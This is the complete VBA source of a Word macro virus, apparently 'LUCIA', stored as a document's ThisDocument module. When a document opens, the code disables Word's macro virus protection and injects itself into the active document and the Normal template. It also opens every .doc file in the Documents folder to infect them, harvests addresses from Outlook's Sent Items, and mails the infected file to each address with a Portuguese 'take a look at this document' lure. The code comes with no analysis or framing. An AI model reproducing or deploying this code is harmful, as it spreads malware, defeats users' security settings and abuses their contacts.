   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Option Explicit 'Cod
   Private Declare Function RasEnumConnections Lib "RasApi32.dll" Alias "RasEnumConnectionsA" (lpRasCon As Any, lpcb As Long, lpcConnections As Long) As Long
   Private Declare Function RasGetConnectStatus Lib "RasApi32.dll" Alias "RasGetConnectStatusA" (ByVal hRasCon As Long, lpStatus As Any) As Long
   Private Const RAS95_MaxEntryName = 256: Private Const RAS95_MaxDeviceType = 16: Private Const RAS95_MaxDeviceName = 32
   Private Type RASCONNSTATUS95: dwSize As Long: RasConnState As Long: dwError As Long: szDeviceType(RAS95_MaxDeviceType) As Byte: szDeviceName(RAS95_MaxDeviceName) As Byte: End Type
   Private Type RASCONN95: dwSize As Long: hRasCon As Long: szEntryName(RAS95_MaxEntryName) As Byte: szDeviceType(RAS95_MaxDeviceType) As Byte: szDeviceName(RAS95_MaxDeviceName) As Byte: End Type
   Dim Copia As Boolean
   Private Sub Document_New()
   On Error Resume Next
       Copia = True: Document_Open
   End Sub
   Private Sub Document_Open()
   On Error Resume Next
   Dim TRasCon(255) As RASCONN95, Lg As Long, lPcon As Long, RetVal As Long, Tstatus As RASCONNSTATUS95
   Dim A As Object, M As Object, Envia As Object, U As Object, Nao As Boolean, Doc As Object, F As Object
   Dim A2 As Integer, I As Integer, Conteudo As String, Email As New Collection, I1 As Integer
   Dim D As Document, Appli As New Application, Macro As String, IsConnected As Boolean
       Application.EnableCancelKey = wdCancelDisabled
       With Options
           .ConfirmConversions = False: .VirusProtection = False: .SaveNormalPrompt = False
       End With
       A2 = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
       Macro = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, A2)
       Set Doc = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
       Conteudo = Doc.Lines(1, 1)
       If Conteudo <> "Option Explicit 'Cod" Then
           If Conteudo <> "" Then Doc.DeleteLines 1, Doc.CountOfLines
           Doc.InsertLines 1, Macro
           With Dialogs(wdDialogFileSummaryInfo): .Title = "LUCIA": .Author = "LUCIA": .Execute: End With
           If ActiveDocument.Saved = False And UCase(Right(ActiveDocument.FullName, 3)) = "DOC" Then ActiveDocument.Save
       End If
       If Dir(Options.DefaultFilePath(wdDocumentsPath) & "\UT987456.117") <> "" Then
           Exit Sub
       End If
       If Copia Then Exit Sub

       TRasCon(0).dwSize = 412
       Lg = 256 * TRasCon(0).dwSize
       RetVal = RasEnumConnections(TRasCon(0), Lg, lPcon)
       Tstatus.dwSize = 160
       RetVal = RasGetConnectStatus(TRasCon(0).hRasCon, Tstatus)
       IsConnected = (Tstatus.RasConnState = &H2000)
       Set A = CreateObject("Outlook.Application")
       If Err.Number <> 0 Or Not IsConnected Then
           Open Options.DefaultFilePath(wdDocumentsPath) & "\UT987456.117" For Output As #1
           Close 1
           Set F = Application.FileSearch
           F.FileName = "*.doc"
           F.LookIn = Options.DefaultFilePath(wdDocumentsPath)
           F.SearchSubFolders = False
           F.Execute
           A2 = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
           If F.FoundFiles.Count > 0 Then
               For I1 = 1 To F.FoundFiles.Count
                   Set D = Appli.Documents.Open(F.FoundFiles(I1))
               Next I1
           End If
           Kill Options.DefaultFilePath(wdDocumentsPath) & "\UT987456.117"
       Else
           Set U = A.GetNamespace("MAPI"): Set M = U.GetDefaultFolder(5)
           For I = 1 To M.Items.Count
               Conteudo = Trim(M.Items(I).To)
               If Left(Conteudo, 1) = "'" And Right(Conteudo, 1) = "'" Then Conteudo = Mid(Conteudo, 2, Len(Conteudo) - 2)
               If Conteudo Like "*@*" And Trim(Conteudo) <> "" Then
                   If Email.Count <> 0 Then
                       For A2 = 1 To Email.Count
                           If Conteudo = Email.Item(A2) Then
                               Nao = True: Exit For
                           End If
                       Next
                   End If
                   If Not Nao Then Email.Add Conteudo
               End If
               Nao = False
           Next
           For I = 1 To Email.Count
               Set Envia = A.CreateItem(0)
               With Envia
                   .Subject = "Mensagem para você": .To = Email.Item(I): .Body = "Quando tiver tempo, de uma olhada neste documento. Até mais...": .Attachments.Add ActiveDocument.FullName, 1, 1, "Documento": .Send
               End With
               Set Envia = Nothing
           Next
       End If
       Set Doc = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
       Conteudo = Doc.Lines(1, 1)
       If Conteudo <> "Option Explicit 'Cod" Then
           If Conteudo <> "" Then Doc.DeleteLines 1, Doc.CountOfLines
           For I = 13 To A2
               Conteudo = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(I, 1)
               Doc.InsertLines I, Conteudo
           Next I
           Doc.InsertLines 1, "Private Sub Document_Open()"
           Doc.InsertLines 1, "End Sub"
           Doc.InsertLines 1, "    Copia = True: Document_Open"
           Doc.InsertLines 1, "On Error Resume Next"
           Doc.InsertLines 1, "Private Sub Document_New()"
           Doc.InsertLines 1, "Dim Copia As Boolean"
           Doc.InsertLines 1, "Private Type RASCONN95: dwSize As Long: hRasCon As Long: szEntryName(RAS95_MaxEntryName) As Byte: szDeviceType(RAS95_MaxDeviceType) As Byte: szDeviceName(RAS95_MaxDeviceName) As Byte: End Type"
           Doc.InsertLines 1, "Private Type RASCONNSTATUS95: dwSize As Long: RasConnState As Long: dwError As Long: szDeviceType(RAS95_MaxDeviceType) As Byte: szDeviceName(RAS95_MaxDeviceName) As Byte: End Type"
           Doc.InsertLines 1, "Private Const RAS95_MaxEntryName = 256: Private Const RAS95_MaxDeviceType = 16: Private Const RAS95_MaxDeviceName = 32"
           Doc.InsertLines 1, "Private Declare Function RasGetConnectStatus Lib " & Chr(34) & "RasApi32.dll" & Chr(34) & " Alias " & Chr(34) & "RasGetConnectStatusA" & Chr(34) & " (ByVal hRasCon As Long, lpStatus As Any) As Long"
           Doc.InsertLines 1, "Private Declare Function RasEnumConnections Lib " & Chr(34) & "RasApi32.dll" & Chr(34) & " Alias " & Chr(34) & "RasEnumConnectionsA" & Chr(34) & " (lpRasCon As Any, lpcb As Long, lpcConnections As Long) As Long"
           Doc.InsertLines 1, "Option Explicit 'Cod"
           NormalTemplate.Save
       End If
       Set A = Nothing: Set M = Nothing: Set Envia = Nothing: Set U = Nothing: Set Doc = Nothing: Appli.Quit wdWordDocument: Set Appli = Nothing: Set F = Nothing
   End Sub
